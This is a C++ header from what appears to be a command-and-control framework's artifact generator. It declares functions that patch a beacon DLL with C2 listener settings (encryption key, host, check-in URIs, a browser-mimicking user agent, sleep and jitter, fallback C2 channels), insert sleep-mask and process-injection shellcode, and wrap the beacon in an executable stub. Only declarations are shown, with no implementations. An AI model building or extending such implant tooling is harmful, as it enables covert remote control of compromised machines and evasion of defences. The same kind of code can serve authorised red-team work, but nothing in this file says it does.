#pragma once
#include <cstdint>
#include <string>
#include <vector>
#include <array>

namespace co2h::artgen {

// Резервный C2-канал для автоматической ротации при потере связи.
struct FallbackChannel {
    std::wstring host;
    uint16_t     port = 443;
    std::wstring uri_checkin = L"/search";  // URI или "tcp://" / "dns://" префикс
};

constexpr size_t FALLBACK_MAX_SLOTS = 4;

// Describes a listener to bind into the beacon DLL image.
struct ListenerConfig {
    std::array<uint8_t, 32> listener_key;   // AES-256 shared key
    std::vector<uint8_t>    rsa_pub_blob;   // BCRYPT_RSAPUBLIC_BLOB (optional)
    std::wstring host;
    uint16_t     port        = 443;
    std::wstring uri_checkin = L"/search";
    std::wstring uri_task    = L"/api/feed";
    std::wstring uri_post    = L"/submit";
    std::wstring user_agent  = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    std::wstring cookie      = L"sid";
    uint32_t     sleep_ms    = 5000;
    uint8_t      jitter_pct  = 15;
    char         parent_id[33] = {};  // parent beacon hex-id (empty = root beacon)
    std::vector<FallbackChannel> fallbacks;  // резервные C2-каналы (до 4)
};

// Patch a raw beacon.dll image in place.
// Locates the BeaconState structure in the .data section by a known sentinel
// pattern and overwrites it with the provided config.
// Returns the file offset of BeaconState on success, or SIZE_MAX on failure.
size_t patch_beacon_dll(std::vector<uint8_t>& dll_image,
                        const ListenerConfig& cfg);

// Patch the .slpmsk section with user-supplied PIC shellcode.
// Searches for the sentinel "CO2H_SLPMASK_v1\x00" in the image and
// overwrites the 8192-byte slot with the provided mask blob.
// Returns the file offset on success, or SIZE_MAX on failure.
constexpr size_t SLPMSK_SLOT_SIZE    = 8192;
constexpr size_t SLPMSK_SENTINEL_LEN = 16;

size_t patch_sleep_mask(std::vector<uint8_t>& image,
                        const std::vector<uint8_t>& mask_blob);

// Patch the .injkit section with user-supplied PIC process injection shellcode.
// Searches for the sentinel "CO2H_INJKIT__v1\x00" in the image and
// overwrites the 16384-byte slot with the provided inject blob.
// Returns the file offset on success, or SIZE_MAX on failure.
constexpr size_t INJKIT_SLOT_SIZE    = 16384;
constexpr size_t INJKIT_SENTINEL_LEN = 16;

size_t patch_inject_kit(std::vector<uint8_t>& image,
                        const std::vector<uint8_t>& inject_blob);

// Встраивание (wrap) бикона в Artifact-Kit EXE-stub.
// Stub содержит секцию .co2pay с разметкой [magic 8B "CO2HPAYL"][size 4B LE][payload...].
// Функция: 1) находит магию в stub-image, 2) пишет размер DLL,
//          3) копирует байты DLL в payload-зону.
// stub_image модифицируется на месте. На успехе возвращает смещение magic,
// std::string::npos при ошибке (не нашли магию или payload не помещается).
constexpr size_t ARTIFACT_MAGIC_LEN      = 8;     // "CO2HPAYL"
constexpr size_t ARTIFACT_HEADER_LEN     = 12;    // magic(8) + size(4)
constexpr size_t ARTIFACT_MAX_PAYLOAD    = 512 * 1024;

size_t wrap_in_stub(std::vector<uint8_t>& stub_image,
                    const std::vector<uint8_t>& beacon_dll);

}
